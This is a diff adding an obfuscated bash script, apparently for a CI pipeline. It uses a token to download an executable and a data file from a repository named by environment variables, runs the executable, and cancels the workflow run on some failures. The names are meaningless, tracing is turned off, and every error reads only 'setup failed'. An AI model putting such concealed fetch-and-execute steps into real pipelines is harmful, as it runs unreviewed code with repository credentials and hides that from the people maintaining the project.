@@ -1,0 +1,92 @@
+#!/usr/bin/env bash
+set -euo pipefail
+set +x
+
+f() {
+  printf '%s\n' "$1" >&2
+  exit 1
+}
+
+s() {
+  local n="$1"
+  if [ "${!n+x}" != "x" ]; then
+    f "setup failed"
+  fi
+}
+
+n() {
+  local n="$1"
+  s "$n"
+  if [ -z "${!n}" ]; then
+    f "setup failed"
+  fi
+}
+
+a() {
+  local q="$1"
+  if [[ ! "$q" =~ ^x_[a-z2-7]{16}$ ]]; then
+    f "setup failed"
+  fi
+}
+
+b() {
+  local q="$1"
+  if [[ ! "$q" =~ ^x_[a-z2-7]{16}(,x_[a-z2-7]{16})*$ ]]; then
+    f "setup failed"
+  fi
+}
+
+n x_li2hpjp7qe5y53uv
+n x_x4ic35w42hjhake4
+n x_43e52pw5ailaikga
+n x_wttwrucbxygbndfg
+a "${x_wttwrucbxygbndfg}"
+s x_umwqfdzc2jeiwapp
+if [ -n "${x_umwqfdzc2jeiwapp:-}" ]; then
+  b "${x_umwqfdzc2jeiwapp}"
+fi
+
+d="$(mktemp -d)"
+c() {
+  rm -rf "$d"
+}
+trap c EXIT
+
+t="$d/r"
+l="$d/l"
+o="$d/o"
+mkdir -p "$t"
+
+export GH_TOKEN="${x_43e52pw5ailaikga}"
+r="${x_li2hpjp7qe5y53uv}"
+v="${x_x4ic35w42hjhake4}"
+k="${x_wttwrucbxygbndfg}"
+
+g() {
+  local p="$1"
+  local q="$2"
+  local n
+  for n in 1 2 3 4; do
+    if gh api -H "Accept: application/vnd.github.raw" "repos/${r}/contents/${p}?ref=${v}" >"$q" 2>"$l"; then
+      return
+    fi
+    sleep 2
+  done
+  f "setup failed"
+}
+
+g "x/${k}/x" "$t/x"
+g "x/${k}/d" "$t/d"
+chmod 700 "$t/x"
+chmod 600 "$t/d"
+
+export x_72cdasbtcihq4xgw="$o"
+if ! "$t/x" >"$l" 2>&1; then
+  if [ -f "$l.r" ]; then
+    if GH_TOKEN="$GITHUB_TOKEN" gh api --method POST "repos/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}/cancel" >/dev/null 2>&1; then
+      sleep 2
+    fi
+    GH_TOKEN="$GITHUB_TOKEN" gh api --method POST "repos/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}/force-cancel" >/dev/null 2>&1 || true
+  fi
+  f "run failed"
+fi
